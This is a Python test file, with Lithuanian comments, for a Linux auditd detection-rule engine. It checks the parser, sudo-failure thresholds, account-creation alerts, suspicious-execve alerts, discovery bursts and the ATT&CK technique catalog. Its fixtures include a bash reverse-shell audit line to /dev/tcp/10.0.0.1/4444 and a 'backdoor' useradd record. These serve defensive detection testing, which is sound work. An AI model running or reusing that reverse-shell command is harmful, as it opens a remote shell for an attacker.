"""
Linux endpoint (auditd) taisyklių testai: parseris ir kiekviena taisyklė.
"""
from __future__ import annotations

import datetime

import attack_catalog
from linux_rules import LinuxEndpointRuleDetector, parse_audit

T0 = datetime.datetime(2022, 1, 24, 4, 40, tzinfo=datetime.timezone.utc)


class FakeLoki:
    def __init__(self, lines: list[str], host: str = "lab-linux"):
        self._lines = [{"timestamp": "0", "line": ln, "labels": {"host": host, "job": "linux_endpoint"}}
                       for ln in lines]

    def query_range(self, query, start=None, end=None, limit=5000):
        return self._lines[:limit]


def _check(lines, **kw):
    return LinuxEndpointRuleDetector(FakeLoki(lines)).check(now=T0, **kw)


# -- Parser ------------------------------------------------------------------

def test_parse_execve_joins_args():
    ev = parse_audit('type=EXECVE msg=audit(1699.1:9): argc=2 a0="bash" a1="-i"')
    assert ev.type == "EXECVE" and ev.command == "bash -i"


def test_parse_quoted_fields():
    ev = parse_audit('type=ADD_USER msg=audit(1:2): acct="backdoor" exe="/usr/sbin/useradd" res=success')
    assert ev.fields["acct"] == "backdoor" and ev.fields["res"] == "success"


def test_parse_non_audit_line():
    assert parse_audit("just a plain log line") is None


# -- Sudo/su failures --------------------------------------------------------

def _sudo_fail(acct="root"):
    return f'type=USER_AUTH msg=audit(1:1): pid=1 uid=1000 acct="{acct}" exe="/usr/bin/sudo" res=failed'


def test_sudo_failures_threshold():
    a = _check([_sudo_fail() for _ in range(3)])
    assert a[0].alert_type == "linux_sudo_auth_failure"
    assert a[0].attack_techniques == ["T1548.003"]
    assert a[0].details["attempts"] == 3


def test_sudo_failures_below_threshold_silent():
    assert _check([_sudo_fail() for _ in range(2)]) == []


def test_successful_sudo_ignored():
    ok = 'type=USER_AUTH msg=audit(1:1): acct="root" exe="/usr/bin/sudo" res=success'
    assert _check([ok, ok, ok]) == []


# -- Account creation --------------------------------------------------------

def test_account_created():
    line = 'type=ADD_USER msg=audit(1:2): acct="backdoor" exe="/usr/sbin/useradd" res=success'
    a = _check([line])
    assert a[0].alert_type == "linux_account_created"
    assert a[0].attack_techniques == ["T1136.001"]


# -- Suspicious execve -------------------------------------------------------

def test_reverse_shell_detected():
    line = 'type=EXECVE msg=audit(1:3): argc=3 a0="bash" a1="-i" a2=">&/dev/tcp/10.0.0.1/4444"'
    a = _check([line])
    assert any(x.alert_type == "linux_suspicious_execve" for x in a)
    assert "T1059.004" in next(x for x in a if x.alert_type == "linux_suspicious_execve").attack_techniques


def test_benign_execve_ignored():
    line = 'type=EXECVE msg=audit(1:3): argc=2 a0="ls" a1="-la"'
    assert _check([line]) == []


# -- Discovery burst ---------------------------------------------------------

def test_discovery_burst_detected():
    cmds = ["whoami", "id", "uname", "netstat"]
    lines = [f'type=EXECVE msg=audit(1:{i}): argc=1 a0="{c}"' for i, c in enumerate(cmds)]
    a = _check(lines)
    assert any(x.alert_type == "linux_discovery_burst" for x in a)


def test_discovery_burst_below_threshold_silent():
    lines = [f'type=EXECVE msg=audit(1:{i}): argc=1 a0="{c}"' for i, c in enumerate(["whoami", "id"])]
    assert [x for x in _check(lines) if x.alert_type == "linux_discovery_burst"] == []


# -- Katalogas ---------------------------------------------------------------

def test_linux_alert_types_in_catalog():
    for t in ("linux_sudo_auth_failure", "linux_account_created", "linux_suspicious_execve",
              "linux_discovery_burst"):
        assert attack_catalog.techniques_for(t), t
